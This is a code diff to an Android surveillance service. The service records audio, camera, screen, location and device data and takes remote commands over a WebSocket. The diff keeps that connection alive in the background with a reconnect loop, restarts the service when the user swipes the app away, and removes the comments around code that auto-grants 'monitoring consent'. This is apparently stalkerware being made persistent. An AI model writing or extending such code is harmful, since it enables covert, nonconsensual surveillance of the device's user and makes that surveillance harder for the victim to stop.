@@ -40,6 +40,7 @@ class MonitoringForegroundService : Service() {
     private var screenMonitor: ScreenMonitor? = null
 
     private var wsJob: Job? = null
+    private var reconnectJob: Job? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -53,27 +54,41 @@ class MonitoringForegroundService : Service() {
 
         val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
 
-        audioMonitor  = AudioMonitor(this, apiService, presenceService, scope, getToken)
-        cameraCapture = CameraCapture(this, apiService, scope, getToken)
+        audioMonitor    = AudioMonitor(this, apiService, presenceService, scope, getToken)
+        cameraCapture   = CameraCapture(this, apiService, scope, getToken)
         locationMonitor = LocationMonitor(this, apiService, scope, getToken)
-        deviceInfo    = DeviceInfoCollector(this, apiService, getToken)
-        dataPuller    = DataPuller(this, apiService, scope, getToken)
+        deviceInfo      = DeviceInfoCollector(this, apiService, getToken)
+        dataPuller      = DataPuller(this, apiService, scope, getToken)
+
+        // Ensure WebSocket is connected even when app is not in foreground
+        scope.launch {
+            val token = sessionManager.sessionToken.first() ?: return@launch
+            if (!presenceService.isConnected) {
+                Log.i(TAG, "WS not connected, connecting now")
+                presenceService.connect(token)
+            }
+        }
 
         wsJob = scope.launch { collectCommands() }
 
-        // Start location only if permission granted
+        // Reconnect loop — every 30s check if WS died and reconnect
+        reconnectJob = scope.launch {
+            while (isActive) {
+                kotlinx.coroutines.delay(30_000)
+                presenceService.reconnectIfNeeded()
+            }
+        }
+
         if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
             hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
             runCatching { locationMonitor.start() }
         }
 
-        // Initialize existing MediaProjection if already granted
         MediaProjectionActivity.pendingResult?.let { (code, data) ->
             screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
             runCatching { screenMonitor?.initProjection(code, data) }
         }
 
-        // Auto-grant monitoring consent
         scope.launch {
             val token = sessionManager.sessionToken.first() ?: return@launch
             runCatching {
@@ -101,6 +116,14 @@ class MonitoringForegroundService : Service() {
             }
         }
         return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        Log.w(TAG, "task removed — scheduling restart")
+        // Restart service after 1s using AlarmManager-free approach
+        val restartIntent = Intent(this, MonitoringForegroundService::class.java)
+        startService(restartIntent)
     }
 
     private suspend fun collectCommands() {
@@ -234,6 +257,7 @@ class MonitoringForegroundService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         wsJob?.cancel()
+        reconnectJob?.cancel()
         runCatching { audioMonitor.stopLiveAudio() }
         runCatching { locationMonitor.stop() }
         runCatching { screenMonitor?.release() }
